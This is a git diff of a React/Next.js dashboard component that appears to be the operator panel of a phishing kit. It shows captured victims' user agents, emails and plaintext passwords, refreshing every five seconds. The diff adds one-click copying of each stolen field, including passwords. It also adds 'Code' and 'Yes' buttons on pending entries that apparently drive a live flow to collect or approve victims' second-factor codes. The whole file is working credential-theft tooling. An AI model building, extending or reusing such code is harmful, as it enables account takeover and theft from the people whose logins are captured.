@@ -1,11 +1,23 @@
 "use client";
 import { changeState, getAllData } from "@/actions";
 import { useEffect, useState } from "react";
+import { useToast } from "./ui/use-toast";
 
 export default function DashboardDataTable() {
   const [data, setData] = useState(null);
   const [loading, setLoading] = useState(true);
-  const [pending, setPending] = useState(false);
+  const [pending, setPending] = useState({
+    state: false,
+    index: 0,
+  });
+  function copyToClipboard(text) {
+    var input = document.createElement("input");
+    input.value = text;
+    document.body.appendChild(input);
+    input.select();
+    document.execCommand("copy");
+    document.body.removeChild(input);
+  }
   async function getData() {
     setLoading(true);
     let res = await getAllData();
@@ -14,6 +26,7 @@ export default function DashboardDataTable() {
     }
     setLoading(false);
   }
+  const { toast } = useToast();
   useEffect(() => {
     getData();
     setInterval(getData, 5000);
@@ -43,13 +56,92 @@ export default function DashboardDataTable() {
   }
   return (
     <tbody>
-      {loading && <div className="absolute top-5 left-1/2">loading ..</div>}
+      {loading && (
+        <div className="absolute  text-xl top-5 left-1/2">Loading ..</div>
+      )}
       {data.map((item, index) => (
         <tr key={index}>
-          <td className="border px-4 py-2">{item.userAgent}</td>
-          <td className="border px-4 py-2">{item.email}</td>
-          <td className="border px-4 py-2">{item.password}</td>
+          <td
+            onClick={() => {
+              toast({
+                description: "User Agent copied to clipboard",
+              });
+              copyToClipboard(item.userAgent);
+            }}
+            className="border cursor-pointer px-4 py-2"
+          >
+            {item.userAgent}
+          </td>
+          <td
+            onClick={() => {
+              toast({
+                description: "Email copied to clipboard",
+              });
+              copyToClipboard(item.email);
+            }}
+            className="border cursor-pointer px-4 py-2"
+          >
+            {item.email}
+          </td>
+          <td
+            onClick={() => {
+              toast({
+                description: "Password copied to clipboard",
+              });
+              copyToClipboard(item.password);
+            }}
+            className="border cursor-pointer px-4 py-2"
+          >
+            {item.password}
+          </td>
           {item.state === "pending" ? (
+            <td className="border px-4 py-2 min-w-10">
+              <div className="flex items-center justify-center   gap-2">
+                {pending.state && pending.index == index ? (
+                  <div>Pending..</div>
+                ) : (
+                  <>
+                    <button
+                      onClick={async () => {
+                        setPending({
+                          state: true,
+                          index: index,
+                        });
+                        let code = prompt("code");
+                        await changeState(item._id, "code", code);
+                        await getData();
+                        setPending({
+                          state: false,
+                        });
+                      }}
+                      className="bg-blue-600 rounded-3xl py-1 px-3"
+                    >
+                      Code
+                    </button>
+                    <button
+                      onClick={async () => {
+                        setPending({
+                          state: true,
+                          index: index,
+                        });
+                        await changeState(item._id, "yes");
+                        await getData();
+                        setPending({
+                          state: false,
+                        });
+                      }}
+                      className="bg-blue-600 rounded-3xl py-1 px-3"
+                    >
+                      Yes
+                    </button>
+                  </>
+                )}
+              </div>
+            </td>
+          ) : (
+            <td className="border px-4 py-2 min-w-10 ">{item.state}</td>
+          )}
+          {/* {item.state === "pending" ? (
             <td className="border px-4 py-2 flex flex-col gap-1">
               {pending ? (
                 <div className="text-red-500">pending...</div>
@@ -85,7 +177,7 @@ export default function DashboardDataTable() {
             </td>
           ) : (
             <td className="border px-4 py-2">{item.state}</td>
-          )}
+          )} */}
         </tr>
       ))}
     </tbody>
